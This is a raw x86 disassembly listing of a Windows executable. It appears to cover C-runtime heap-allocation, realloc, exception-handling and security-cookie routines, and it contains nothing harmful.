  426f09:	xor    eax,eax
  426f0b:	inc    eax
  426f0c:	pop    edi
  426f0d:	pop    esi
  426f0e:	pop    ebx
  426f0f:	leave  
  426f10:	ret    
  426f11:	push   ebp
  426f12:	mov    ebp,esp
  426f14:	sub    esp,0x14
  426f17:	mov    ecx,DWORD PTR [ebp+0x8]
  426f1a:	mov    eax,ds:0x45defc
  426f1f:	mov    edx,DWORD PTR ds:0x45df00
  426f25:	add    ecx,0x17
  426f28:	and    ecx,0xfffffff0
  426f2b:	push   ebx
  426f2c:	mov    DWORD PTR [ebp-0x10],ecx
  426f2f:	sar    ecx,0x4
  426f32:	push   esi
  426f33:	lea    eax,[eax+eax*4]
  426f36:	push   edi
  426f37:	dec    ecx
  426f38:	cmp    ecx,0x20
  426f3b:	lea    edi,[edx+eax*4]
  426f3e:	mov    DWORD PTR [ebp-0x4],edi
  426f41:	jge    0x426f4e
  426f43:	or     esi,0xffffffff
  426f46:	shr    esi,cl
  426f48:	or     DWORD PTR [ebp-0x8],0xffffffff
  426f4c:	jmp    0x426f5b
  426f4e:	add    ecx,0xffffffe0
  426f51:	or     eax,0xffffffff
  426f54:	xor    esi,esi
  426f56:	shr    eax,cl
  426f58:	mov    DWORD PTR [ebp-0x8],eax
  426f5b:	mov    eax,ds:0x45df08
  426f60:	mov    ebx,eax
  426f62:	mov    DWORD PTR [ebp-0xc],esi
  426f65:	cmp    ebx,edi
  426f67:	jmp    0x426f7d
  426f69:	mov    ecx,DWORD PTR [ebx+0x4]
  426f6c:	mov    edi,DWORD PTR [ebx]
  426f6e:	and    ecx,DWORD PTR [ebp-0x8]
  426f71:	and    edi,esi
  426f73:	or     ecx,edi
  426f75:	jne    0x426f82
  426f77:	add    ebx,0x14
  426f7a:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f7d:	mov    DWORD PTR [ebp+0x8],ebx
  426f80:	jb     0x426f69
  426f82:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f85:	jne    0x426fab
  426f87:	mov    ebx,edx
  426f89:	jmp    0x426f9c
  426f8b:	mov    ecx,DWORD PTR [ebx+0x4]
  426f8e:	mov    edi,DWORD PTR [ebx]
  426f90:	and    ecx,DWORD PTR [ebp-0x8]
  426f93:	and    edi,esi
  426f95:	or     ecx,edi
  426f97:	jne    0x426fa3
  426f99:	add    ebx,0x14
  426f9c:	cmp    ebx,eax
  426f9e:	mov    DWORD PTR [ebp+0x8],ebx
  426fa1:	jb     0x426f8b
  426fa3:	cmp    ebx,eax
  426fa5:	je     0x42703f
  426fab:	mov    DWORD PTR ds:0x45df08,ebx
  426fb1:	mov    eax,DWORD PTR [ebx+0x10]
  426fb4:	mov    edx,DWORD PTR [eax]
  426fb6:	cmp    edx,0xffffffff
  426fb9:	mov    DWORD PTR [ebp-0x4],edx
  426fbc:	je     0x426fd2
  426fbe:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  426fc5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  426fc9:	and    ecx,DWORD PTR [ebp-0x8]
  426fcc:	and    edi,esi
  426fce:	or     ecx,edi
  426fd0:	jne    0x427008
  426fd2:	mov    edx,DWORD PTR [eax+0xc4]
  426fd8:	and    edx,DWORD PTR [ebp-0x8]
  426fdb:	and    DWORD PTR [ebp-0x4],0x0
  426fdf:	lea    ecx,[eax+0x44]
  426fe2:	mov    esi,DWORD PTR [ecx]
  426fe4:	and    esi,DWORD PTR [ebp-0xc]
  426fe7:	or     edx,esi
  426fe9:	mov    esi,DWORD PTR [ebp-0xc]
  426fec:	jne    0x427005
  426fee:	mov    edx,DWORD PTR [ecx+0x84]
  426ff4:	and    edx,DWORD PTR [ebp-0x8]
  426ff7:	inc    DWORD PTR [ebp-0x4]
  426ffa:	add    ecx,0x4
  426ffd:	mov    edi,DWORD PTR [ecx]
  426fff:	and    edi,esi
  427001:	or     edx,edi
  427003:	je     0x426fee
  427005:	mov    edx,DWORD PTR [ebp-0x4]
  427008:	mov    ecx,edx
  42700a:	imul   ecx,ecx,0x204
  427010:	lea    ecx,[ecx+eax*1+0x144]
  427017:	mov    DWORD PTR [ebp-0xc],ecx
  42701a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42701e:	xor    edi,edi
  427020:	and    ecx,esi
  427022:	jne    0x427091
  427024:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42702b:	and    ecx,DWORD PTR [ebp-0x8]
  42702e:	push   0x20
  427030:	pop    edi
  427031:	jmp    0x427091
  427033:	cmp    DWORD PTR [ebx+0x8],0x0
  427037:	jne    0x427044
  427039:	add    ebx,0x14
  42703c:	mov    DWORD PTR [ebp+0x8],ebx
  42703f:	cmp    ebx,DWORD PTR [ebp-0x4]
  427042:	jb     0x427033
  427044:	cmp    ebx,DWORD PTR [ebp-0x4]
  427047:	jne    0x42706f
  427049:	mov    ebx,edx
  42704b:	jmp    0x427056
  42704d:	cmp    DWORD PTR [ebx+0x8],0x0
  427051:	jne    0x42705d
  427053:	add    ebx,0x14
  427056:	cmp    ebx,eax
  427058:	mov    DWORD PTR [ebp+0x8],ebx
  42705b:	jb     0x42704d
  42705d:	cmp    ebx,eax
  42705f:	jne    0x42706f
  427061:	call   0x426a75
  427066:	mov    ebx,eax
  427068:	test   ebx,ebx
  42706a:	mov    DWORD PTR [ebp+0x8],ebx
  42706d:	je     0x427087
  42706f:	push   ebx
  427070:	call   0x426b2c
  427075:	pop    ecx
  427076:	mov    ecx,DWORD PTR [ebx+0x10]
  427079:	mov    DWORD PTR [ecx],eax
  42707b:	mov    eax,DWORD PTR [ebx+0x10]
  42707e:	cmp    DWORD PTR [eax],0xffffffff
  427081:	jne    0x426fab
  427087:	xor    eax,eax
  427089:	jmp    0x427208
  42708e:	shl    ecx,1
  427090:	inc    edi
  427091:	test   ecx,ecx
  427093:	jge    0x42708e
  427095:	mov    ecx,DWORD PTR [ebp-0xc]
  427098:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42709c:	mov    ecx,DWORD PTR [edx]
  42709e:	sub    ecx,DWORD PTR [ebp-0x10]
  4270a1:	mov    esi,ecx
  4270a3:	sar    esi,0x4
  4270a6:	dec    esi
  4270a7:	cmp    esi,0x3f
  4270aa:	mov    DWORD PTR [ebp-0x8],ecx
  4270ad:	jle    0x4270b2
  4270af:	push   0x3f
  4270b1:	pop    esi
  4270b2:	cmp    esi,edi
  4270b4:	je     0x4271bb
  4270ba:	mov    ecx,DWORD PTR [edx+0x4]
  4270bd:	cmp    ecx,DWORD PTR [edx+0x8]
  4270c0:	jne    0x42711e
  4270c2:	cmp    edi,0x20
  4270c5:	mov    ebx,0x80000000
  4270ca:	jge    0x4270f2
  4270cc:	mov    ecx,edi
  4270ce:	shr    ebx,cl
  4270d0:	mov    ecx,DWORD PTR [ebp-0x4]
  4270d3:	lea    edi,[eax+edi*1+0x4]
  4270d7:	not    ebx
  4270d9:	mov    DWORD PTR [ebp-0x14],ebx
  4270dc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4270e0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4270e4:	dec    BYTE PTR [edi]
  4270e6:	jne    0x42711b
  4270e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4270eb:	mov    ebx,DWORD PTR [ebp+0x8]
  4270ee:	and    DWORD PTR [ebx],ecx
  4270f0:	jmp    0x42711e
  4270f2:	lea    ecx,[edi-0x20]
  4270f5:	shr    ebx,cl
  4270f7:	mov    ecx,DWORD PTR [ebp-0x4]
  4270fa:	lea    ecx,[eax+ecx*4+0xc4]
  427101:	lea    edi,[eax+edi*1+0x4]
  427105:	not    ebx
  427107:	and    DWORD PTR [ecx],ebx
  427109:	dec    BYTE PTR [edi]
  42710b:	mov    DWORD PTR [ebp-0x14],ebx
  42710e:	jne    0x42711b
  427110:	mov    ebx,DWORD PTR [ebp+0x8]
  427113:	mov    ecx,DWORD PTR [ebp-0x14]
  427116:	and    DWORD PTR [ebx+0x4],ecx
  427119:	jmp    0x42711e
  42711b:	mov    ebx,DWORD PTR [ebp+0x8]
  42711e:	cmp    DWORD PTR [ebp-0x8],0x0
  427122:	mov    ecx,DWORD PTR [edx+0x8]
  427125:	mov    edi,DWORD PTR [edx+0x4]
  427128:	mov    DWORD PTR [ecx+0x4],edi
  42712b:	mov    ecx,DWORD PTR [edx+0x4]
  42712e:	mov    edi,DWORD PTR [edx+0x8]
  427131:	mov    DWORD PTR [ecx+0x8],edi
  427134:	je     0x4271c7
  42713a:	mov    ecx,DWORD PTR [ebp-0xc]
  42713d:	lea    ecx,[ecx+esi*8]
  427140:	mov    edi,DWORD PTR [ecx+0x4]
  427143:	mov    DWORD PTR [edx+0x8],ecx
  427146:	mov    DWORD PTR [edx+0x4],edi
  427149:	mov    DWORD PTR [ecx+0x4],edx
  42714c:	mov    ecx,DWORD PTR [edx+0x4]
  42714f:	mov    DWORD PTR [ecx+0x8],edx
  427152:	mov    ecx,DWORD PTR [edx+0x4]
  427155:	cmp    ecx,DWORD PTR [edx+0x8]
  427158:	jne    0x4271b8
  42715a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42715e:	mov    BYTE PTR [ebp+0xb],cl
  427161:	inc    cl
  427163:	cmp    esi,0x20
  427166:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42716a:	jge    0x42718f
  42716c:	cmp    BYTE PTR [ebp+0xb],0x0
  427170:	jne    0x42717d
  427172:	mov    edi,0x80000000
  427177:	mov    ecx,esi
  427179:	shr    edi,cl
  42717b:	or     DWORD PTR [ebx],edi
  42717d:	mov    ecx,esi
  42717f:	mov    edi,0x80000000
  427184:	shr    edi,cl
  427186:	mov    ecx,DWORD PTR [ebp-0x4]
  427189:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42718d:	jmp    0x4271b8
  42718f:	cmp    BYTE PTR [ebp+0xb],0x0
  427193:	jne    0x4271a2
  427195:	lea    ecx,[esi-0x20]
  427198:	mov    edi,0x80000000
  42719d:	shr    edi,cl
  42719f:	or     DWORD PTR [ebx+0x4],edi
  4271a2:	mov    ecx,DWORD PTR [ebp-0x4]
  4271a5:	lea    edi,[eax+ecx*4+0xc4]
  4271ac:	lea    ecx,[esi-0x20]
  4271af:	mov    esi,0x80000000
  4271b4:	shr    esi,cl
  4271b6:	or     DWORD PTR [edi],esi
  4271b8:	mov    ecx,DWORD PTR [ebp-0x8]
  4271bb:	test   ecx,ecx
  4271bd:	je     0x4271ca
  4271bf:	mov    DWORD PTR [edx],ecx
  4271c1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4271c5:	jmp    0x4271ca
  4271c7:	mov    ecx,DWORD PTR [ebp-0x8]
  4271ca:	mov    esi,DWORD PTR [ebp-0x10]
  4271cd:	add    edx,ecx
  4271cf:	lea    ecx,[esi+0x1]
  4271d2:	mov    DWORD PTR [edx],ecx
  4271d4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4271d8:	mov    esi,DWORD PTR [ebp-0xc]
  4271db:	mov    ecx,DWORD PTR [esi]
  4271dd:	test   ecx,ecx
  4271df:	lea    edi,[ecx+0x1]
  4271e2:	mov    DWORD PTR [esi],edi
  4271e4:	jne    0x427200
  4271e6:	cmp    ebx,DWORD PTR ds:0x45def8
  4271ec:	jne    0x427200
  4271ee:	mov    ecx,DWORD PTR [ebp-0x4]
  4271f1:	cmp    ecx,DWORD PTR ds:0x45df10
  4271f7:	jne    0x427200
  4271f9:	and    DWORD PTR ds:0x45def8,0x0
  427200:	mov    ecx,DWORD PTR [ebp-0x4]
  427203:	mov    DWORD PTR [eax],ecx
  427205:	lea    eax,[edx+0x4]
  427208:	pop    edi
  427209:	pop    esi
  42720a:	pop    ebx
  42720b:	leave  
  42720c:	ret    
  42720d:	int3   
  42720e:	int3   
  42720f:	int3   
  427210:	push   esi
  427211:	inc    ebx
  427212:	xor    dh,BYTE PTR [eax]
  427214:	pop    eax
  427215:	inc    ebx
  427216:	xor    BYTE PTR [eax],dh
  427218:	push   ebp
  427219:	mov    ebp,esp
  42721b:	sub    esp,0x8
  42721e:	push   ebx
  42721f:	push   esi
  427220:	push   edi
  427221:	push   ebp
  427222:	cld    
  427223:	mov    ebx,DWORD PTR [ebp+0xc]
  427226:	mov    eax,DWORD PTR [ebp+0x8]
  427229:	test   DWORD PTR [eax+0x4],0x6
  427230:	jne    0x4272b8
  427236:	mov    DWORD PTR [ebp-0x8],eax
  427239:	mov    eax,DWORD PTR [ebp+0x10]
  42723c:	mov    DWORD PTR [ebp-0x4],eax
  42723f:	lea    eax,[ebp-0x8]
  427242:	mov    DWORD PTR [ebx-0x4],eax
  427245:	mov    esi,DWORD PTR [ebx+0xc]
  427248:	mov    edi,DWORD PTR [ebx+0x8]
  42724b:	cmp    esi,0xffffffff
  42724e:	je     0x4272b1
  427250:	lea    ecx,[esi+esi*2]
  427253:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  427258:	je     0x42729f
  42725a:	push   esi
  42725b:	push   ebp
  42725c:	lea    ebp,[ebx+0x10]
  42725f:	call   DWORD PTR [edi+ecx*4+0x4]
  427263:	pop    ebp
  427264:	pop    esi
  427265:	mov    ebx,DWORD PTR [ebp+0xc]
  427268:	or     eax,eax
  42726a:	je     0x42729f
  42726c:	js     0x4272aa
  42726e:	mov    edi,DWORD PTR [ebx+0x8]
  427271:	push   ebx
  427272:	call   0x4281a0
  427277:	add    esp,0x4
  42727a:	lea    ebp,[ebx+0x10]
  42727d:	push   esi
  42727e:	push   ebx
  42727f:	call   0x4281e2
  427284:	add    esp,0x8
  427287:	lea    ecx,[esi+esi*2]
  42728a:	push   0x1
  42728c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  427290:	call   0x428276
  427295:	mov    eax,DWORD PTR [edi+ecx*4]
  427298:	mov    DWORD PTR [ebx+0xc],eax
  42729b:	call   DWORD PTR [edi+ecx*4+0x8]
  42729f:	mov    edi,DWORD PTR [ebx+0x8]
  4272a2:	lea    ecx,[esi+esi*2]
  4272a5:	mov    esi,DWORD PTR [edi+ecx*4]
  4272a8:	jmp    0x42724b
  4272aa:	mov    eax,0x0
  4272af:	jmp    0x4272cd
  4272b1:	mov    eax,0x1
  4272b6:	jmp    0x4272cd
  4272b8:	push   ebp
  4272b9:	lea    ebp,[ebx+0x10]
  4272bc:	push   0xffffffff
  4272be:	push   ebx
  4272bf:	call   0x4281e2
  4272c4:	add    esp,0x8
  4272c7:	pop    ebp
  4272c8:	mov    eax,0x1
  4272cd:	pop    ebp
  4272ce:	pop    edi
  4272cf:	pop    esi
  4272d0:	pop    ebx
  4272d1:	mov    esp,ebp
  4272d3:	pop    ebp
  4272d4:	ret    
  4272d5:	push   ebp
  4272d6:	mov    ecx,DWORD PTR [esp+0x8]
  4272da:	mov    ebp,DWORD PTR [ecx]
  4272dc:	mov    eax,DWORD PTR [ecx+0x1c]
  4272df:	push   eax
  4272e0:	mov    eax,DWORD PTR [ecx+0x18]
  4272e3:	push   eax
  4272e4:	call   0x4281e2
  4272e9:	add    esp,0x8
  4272ec:	pop    ebp
  4272ed:	ret    0x4
  4272f0:	call   0x425203
  4272f5:	add    eax,0x8
  4272f8:	ret    
  4272f9:	push   0x14
  4272fb:	push   0x429880
  427300:	call   0x425350
  427305:	mov    edi,DWORD PTR [ebp+0x8]
  427308:	xor    ebx,ebx
  42730a:	cmp    edi,ebx
  42730c:	jne    0x42731c
  42730e:	push   DWORD PTR [ebp+0xc]
  427311:	call   0x426072
  427316:	pop    ecx
  427317:	jmp    0x4274a0
  42731c:	mov    esi,DWORD PTR [ebp+0xc]
  42731f:	cmp    esi,ebx
  427321:	jne    0x42732f
  427323:	push   edi
  427324:	call   0x425f5a
  427329:	pop    ecx
  42732a:	jmp    0x42749e
  42732f:	cmp    DWORD PTR ds:0x45e144,0x3
  427336:	jne    0x42746a
  42733c:	mov    DWORD PTR [ebp-0x1c],ebx
  42733f:	cmp    esi,0xffffffe0
  427342:	ja     0x427439
  427348:	push   0x4
  42734a:	call   0x42550f
  42734f:	pop    ecx
  427350:	mov    DWORD PTR [ebp-0x4],ebx
  427353:	push   edi
  427354:	call   0x426732
  427359:	pop    ecx
  42735a:	mov    DWORD PTR [ebp-0x20],eax
  42735d:	cmp    eax,ebx
  42735f:	je     0x427409
  427365:	cmp    esi,DWORD PTR ds:0x45df04
  42736b:	ja     0x4273b9
  42736d:	push   esi
  42736e:	push   edi
  42736f:	push   eax
  427370:	call   0x426c32
  427375:	add    esp,0xc
  427378:	test   eax,eax
  42737a:	je     0x427381
  42737c:	mov    DWORD PTR [ebp-0x1c],edi
  42737f:	jmp    0x4273b9
  427381:	push   esi
  427382:	call   0x426f11
  427387:	pop    ecx
  427388:	mov    DWORD PTR [ebp-0x1c],eax
  42738b:	cmp    eax,ebx
  42738d:	je     0x4273b9
  42738f:	mov    eax,DWORD PTR [edi-0x4]
  427392:	dec    eax
  427393:	mov    DWORD PTR [ebp-0x24],eax
  427396:	cmp    eax,esi
  427398:	jb     0x42739c
  42739a:	mov    eax,esi
  42739c:	push   eax
  42739d:	push   edi
  42739e:	push   DWORD PTR [ebp-0x1c]
  4273a1:	call   0x426090
  4273a6:	push   edi
  4273a7:	call   0x426732
  4273ac:	mov    DWORD PTR [ebp-0x20],eax
  4273af:	push   edi
  4273b0:	push   eax
  4273b1:	call   0x42675d
  4273b6:	add    esp,0x18
  4273b9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4273bc:	jne    0x427409
  4273be:	cmp    esi,ebx
  4273c0:	jne    0x4273c8
  4273c2:	xor    esi,esi
  4273c4:	inc    esi
  4273c5:	mov    DWORD PTR [ebp+0xc],esi
  4273c8:	add    esi,0xf
  4273cb:	and    esi,0xfffffff0
  4273ce:	mov    DWORD PTR [ebp+0xc],esi
  4273d1:	push   esi
  4273d2:	push   ebx
  4273d3:	push   DWORD PTR ds:0x45e140
  4273d9:	call   DWORD PTR ds:0x429030
  4273df:	mov    DWORD PTR [ebp-0x1c],eax
  4273e2:	cmp    eax,ebx
  4273e4:	je     0x427409
  4273e6:	mov    eax,DWORD PTR [edi-0x4]
  4273e9:	dec    eax
  4273ea:	mov    DWORD PTR [ebp-0x24],eax
  4273ed:	cmp    eax,esi
  4273ef:	jb     0x4273f3
  4273f1:	mov    eax,esi
  4273f3:	push   eax
  4273f4:	push   edi
  4273f5:	push   DWORD PTR [ebp-0x1c]
  4273f8:	call   0x426090
  4273fd:	push   edi
  4273fe:	push   DWORD PTR [ebp-0x20]
  427401:	call   0x42675d
  427406:	add    esp,0x14
  427409:	or     DWORD PTR [ebp-0x4],0xffffffff
  42740d:	call   0x427461
  427412:	cmp    DWORD PTR [ebp-0x20],ebx
  427415:	jne    0x427439
  427417:	cmp    esi,ebx
  427419:	jne    0x42741e
  42741b:	xor    esi,esi
  42741d:	inc    esi
  42741e:	add    esi,0xf
  427421:	and    esi,0xfffffff0
  427424:	mov    DWORD PTR [ebp+0xc],esi
  427427:	push   esi
  427428:	push   edi
  427429:	push   ebx
  42742a:	push   DWORD PTR ds:0x45e140
  427430:	call   DWORD PTR ds:0x4290d4
  427436:	mov    DWORD PTR [ebp-0x1c],eax
  427439:	mov    eax,DWORD PTR [ebp-0x1c]
  42743c:	cmp    eax,ebx
  42743e:	jne    0x4274a0
  427440:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427446:	je     0x4274a0
  427448:	push   esi
  427449:	call   0x427c32
  42744e:	pop    ecx
  42744f:	test   eax,eax
  427451:	jne    0x42733c
  427457:	jmp    0x42749e
  427459:	xor    ebx,ebx
  42745b:	mov    esi,DWORD PTR [ebp+0xc]
  42745e:	mov    edi,DWORD PTR [ebp+0x8]
  427461:	push   0x4
  427463:	call   0x42547b
  427468:	pop    ecx
  427469:	ret    
  42746a:	xor    eax,eax
  42746c:	cmp    esi,0xffffffe0
  42746f:	ja     0x427487
  427471:	cmp    esi,ebx
  427473:	jne    0x427478
  427475:	xor    esi,esi
  427477:	inc    esi
  427478:	push   esi
  427479:	push   edi
  42747a:	push   ebx
  42747b:	push   DWORD PTR ds:0x45e140
  427481:	call   DWORD PTR ds:0x4290d4
  427487:	cmp    eax,ebx
  427489:	jne    0x4274a0
  42748b:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427491:	je     0x4274a0
  427493:	push   esi
  427494:	call   0x427c32
  427499:	pop    ecx
  42749a:	test   eax,eax
  42749c:	jne    0x42746a
  42749e:	xor    eax,eax
  4274a0:	call   0x42538b
  4274a5:	ret    
  4274a6:	push   0x10
  4274a8:	push   0x429890
  4274ad:	call   0x425350
  4274b2:	cmp    DWORD PTR ds:0x45e144,0x3
  4274b9:	jne    0x4274f5
  4274bb:	push   0x4
  4274bd:	call   0x42550f
  4274c2:	pop    ecx
  4274c3:	and    DWORD PTR [ebp-0x4],0x0
  4274c7:	mov    esi,DWORD PTR [ebp+0x8]
  4274ca:	push   esi
  4274cb:	call   0x426732
  4274d0:	pop    ecx
  4274d1:	mov    DWORD PTR [ebp-0x1c],eax
  4274d4:	test   eax,eax
  4274d6:	je     0x4274e3
  4274d8:	mov    esi,DWORD PTR [esi-0x4]
  4274db:	sub    esi,0x9
  4274de:	mov    DWORD PTR [ebp-0x20],esi
  4274e1:	jmp    0x4274e6
  4274e3:	mov    esi,DWORD PTR [ebp-0x20]
  4274e6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4274ea:	call   0x427513
  4274ef:	cmp    DWORD PTR [ebp-0x1c],0x0
  4274f3:	jne    0x427508
  4274f5:	push   DWORD PTR [ebp+0x8]
  4274f8:	push   0x0
  4274fa:	push   DWORD PTR ds:0x45e140
  427500:	call   DWORD PTR ds:0x4290d8
  427506:	mov    esi,eax
  427508:	mov    eax,esi
  42750a:	call   0x42538b
  42750f:	ret    
  427510:	mov    esi,DWORD PTR [ebp-0x20]
  427513:	push   0x4
  427515:	call   0x42547b
  42751a:	pop    ecx
  42751b:	ret    
  42751c:	push   ebp
  42751d:	mov    ebp,esp
  42751f:	sub    esp,0x10
  427522:	push   esi
  427523:	lea    eax,[ebp-0x8]
  427526:	push   eax
  427527:	call   DWORD PTR ds:0x4290e8
  42752d:	mov    esi,DWORD PTR [ebp-0x4]
  427530:	xor    esi,DWORD PTR [ebp-0x8]
  427533:	call   DWORD PTR ds:0x4290e4
  427539:	xor    esi,eax
  42753b:	call   DWORD PTR ds:0x42909c
  427541:	xor    esi,eax
  427543:	call   DWORD PTR ds:0x4290e0
  427549:	xor    esi,eax
  42754b:	lea    eax,[ebp-0x10]
  42754e:	push   eax
  42754f:	call   DWORD PTR ds:0x4290dc
  427555:	mov    eax,DWORD PTR [ebp-0xc]
  427558:	xor    eax,DWORD PTR [ebp-0x10]
  42755b:	xor    esi,eax
  42755d:	mov    DWORD PTR ds:0x45d430,esi
  427563:	jne    0x42756f
  427565:	mov    DWORD PTR ds:0x45d430,0xbb40e64e
  42756f:	pop    esi
  427570:	leave  
  427571:	ret    
  427572:	push   0x118
  427577:	push   0x429a40
  42757c:	call   0x425350
  427581:	mov    eax,ds:0x45d430
  427586:	xor    eax,DWORD PTR [ebp+0x4]
  427589:	mov    DWORD PTR [ebp-0x1c],eax
  42758c:	mov    eax,ds:0x45dd98
  427591:	xor    ecx,ecx
  427593:	cmp    eax,ecx
  427595:	je     0x4275b6
  427597:	mov    DWORD PTR [ebp-0x4],ecx
  42759a:	push   DWORD PTR [ebp+0xc]
  42759d:	push   DWORD PTR [ebp+0x8]
  4275a0:	call   eax
  4275a2:	pop    ecx
  4275a3:	pop    ecx
  4275a4:	or     DWORD PTR [ebp-0x4],0xffffffff
  4275a8:	jmp    0x4276b4
  4275ad:	xor    eax,eax
  4275af:	inc    eax
  4275b0:	ret    
  4275b1:	mov    esp,DWORD PTR [ebp-0x18]
  4275b4:	jmp    0x4275a4
  4275b6:	mov    eax,DWORD PTR [ebp+0x8]
  4275b9:	dec    eax
  4275ba:	je     0x4275cf
  4275bc:	mov    edi,0x429a1c
  4275c1:	mov    DWORD PTR [ebp-0x20],0x429968
  4275c8:	mov    esi,0xd4
  4275cd:	jmp    0x4275e0
  4275cf:	mov    edi,0x429948
  4275d4:	mov    DWORD PTR [ebp-0x20],0x4298a8
  4275db:	mov    esi,0xb9
  4275e0:	mov    BYTE PTR [ebp-0x24],cl
  4275e3:	push   0x104
  4275e8:	lea    eax,[ebp-0x128]
  4275ee:	push   eax
  4275ef:	push   ecx
  4275f0:	call   DWORD PTR ds:0x42906c
  4275f6:	test   eax,eax
  4275f8:	jne    0x42760d
  4275fa:	push   0x42959c
  4275ff:	lea    eax,[ebp-0x128]
  427605:	push   eax
  427606:	call   0x425730
  42760b:	pop    ecx
  42760c:	pop    ecx
  42760d:	lea    ebx,[ebp-0x128]
  427613:	lea    eax,[ebp-0x128]
  427619:	push   eax
  42761a:	call   0x425960
  42761f:	pop    ecx
  427620:	add    eax,0xb
  427623:	cmp    eax,0x3c
  427626:	jbe    0x427651
  427628:	lea    eax,[ebp-0x128]
  42762e:	push   eax
  42762f:	call   0x425960
  427634:	mov    ebx,eax
  427636:	lea    eax,[ebp-0x128]
  42763c:	sub    eax,0x31
  42763f:	add    ebx,eax
  427641:	push   0x3
  427643:	push   0x429598
  427648:	push   ebx
  427649:	call   0x425830
  42764e:	add    esp,0x10
  427651:	push   ebx
  427652:	call   0x425960
  427657:	pop    ecx
  427658:	lea    eax,[eax+esi*1+0xc]
  42765c:	add    eax,0x3
  42765f:	and    eax,0xfffffffc
  427662:	call   0x4253a0
  427667:	mov    DWORD PTR [ebp-0x18],esp
  42766a:	mov    esi,esp
  42766c:	push   edi
  42766d:	push   esi
  42766e:	call   0x425730
  427673:	mov    edi,0x429578
  427678:	push   edi
  427679:	push   esi
  42767a:	call   0x425740
  42767f:	push   0x42989c
  427684:	push   esi
  427685:	call   0x425740
  42768a:	push   ebx
  42768b:	push   esi
  42768c:	call   0x425740
  427691:	push   edi
  427692:	push   esi
  427693:	call   0x425740
  427698:	push   DWORD PTR [ebp-0x20]
  42769b:	push   esi
  42769c:	call   0x425740
  4276a1:	push   0x12010
  4276a6:	push   0x429550
  4276ab:	push   esi
  4276ac:	call   0x425632
  4276b1:	add    esp,0x3c
  4276b4:	push   0x3
  4276b6:	call   0x4247bc
  4276bb:	int3   
  4276bc:	push   0x38
  4276be:	push   0x429e60
  4276c3:	call   0x425350
  4276c8:	xor    ebx,ebx
  4276ca:	cmp    DWORD PTR ds:0x45ddbc,ebx
  4276d0:	jne    0x42770a
  4276d2:	push   ebx
  4276d3:	push   ebx
  4276d4:	xor    esi,esi
  4276d6:	inc    esi
  4276d7:	push   esi
  4276d8:	push   0x429e5c
  4276dd:	push   0x100
  4276e2:	push   ebx
  4276e3:	call   DWORD PTR ds:0x4290f4
  4276e9:	test   eax,eax
  4276eb:	je     0x4276f5
  4276ed:	mov    DWORD PTR ds:0x45ddbc,esi
  4276f3:	jmp    0x42770a
  4276f5:	call   DWORD PTR ds:0x429028
  4276fb:	cmp    eax,0x78
  4276fe:	jne    0x42770a
  427700:	mov    DWORD PTR ds:0x45ddbc,0x2
  42770a:	cmp    DWORD PTR [ebp+0x14],ebx
  42770d:	jle    0x42772a
  42770f:	mov    ecx,DWORD PTR [ebp+0x14]
  427712:	mov    eax,DWORD PTR [ebp+0x10]
  427715:	dec    ecx
  427716:	cmp    BYTE PTR [eax],bl
  427718:	je     0x427722
  42771a:	inc    eax
  42771b:	cmp    ecx,ebx
  42771d:	jne    0x427715
  42771f:	or     ecx,0xffffffff
  427722:	or     eax,0xffffffff
  427725:	sub    eax,ecx
  427727:	add    DWORD PTR [ebp+0x14],eax
  42772a:	mov    eax,ds:0x45ddbc
  42772f:	cmp    eax,0x2
  427732:	je     0x427914
  427738:	cmp    eax,ebx
  42773a:	je     0x427914
  427740:	cmp    eax,0x1
  427743:	jne    0x427947
  427749:	xor    edi,edi
  42774b:	mov    DWORD PTR [ebp-0x1c],edi
  42774e:	mov    DWORD PTR [ebp-0x20],ebx
  427751:	mov    DWORD PTR [ebp-0x24],ebx
  427754:	cmp    DWORD PTR [ebp+0x20],ebx
  427757:	jne    0x427761
  427759:	mov    eax,ds:0x45ddb4
  42775e:	mov    DWORD PTR [ebp+0x20],eax
  427761:	push   ebx
  427762:	push   ebx
  427763:	push   DWORD PTR [ebp+0x14]
  427766:	push   DWORD PTR [ebp+0x10]
  427769:	xor    eax,eax
  42776b:	cmp    DWORD PTR [ebp+0x24],ebx
  42776e:	setne  al
  427771:	lea    eax,[eax*8+0x1]
  427778:	push   eax
  427779:	push   DWORD PTR [ebp+0x20]
  42777c:	call   DWORD PTR ds:0x4290f0
  427782:	mov    esi,eax
  427784:	mov    DWORD PTR [ebp-0x28],esi
  427787:	cmp    esi,ebx
  427789:	je     0x427947
  42778f:	mov    DWORD PTR [ebp-0x4],0x1
  427796:	lea    eax,[esi+esi*1]
  427799:	add    eax,0x3
  42779c:	and    eax,0xfffffffc
  42779f:	call   0x4253a0
  4277a4:	mov    DWORD PTR [ebp-0x18],esp
  4277a7:	mov    eax,esp
  4277a9:	mov    DWORD PTR [ebp-0x2c],eax
  4277ac:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277b0:	jmp    0x4277cd
  4277b2:	xor    eax,eax
  4277b4:	inc    eax
  4277b5:	ret    
  4277b6:	mov    esp,DWORD PTR [ebp-0x18]
  4277b9:	call   0x4287e5
  4277be:	xor    ebx,ebx
  4277c0:	mov    DWORD PTR [ebp-0x2c],ebx
  4277c3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277c7:	mov    edi,DWORD PTR [ebp-0x1c]
  4277ca:	mov    esi,DWORD PTR [ebp-0x28]
  4277cd:	cmp    DWORD PTR [ebp-0x2c],ebx
  4277d0:	jne    0x4277ee
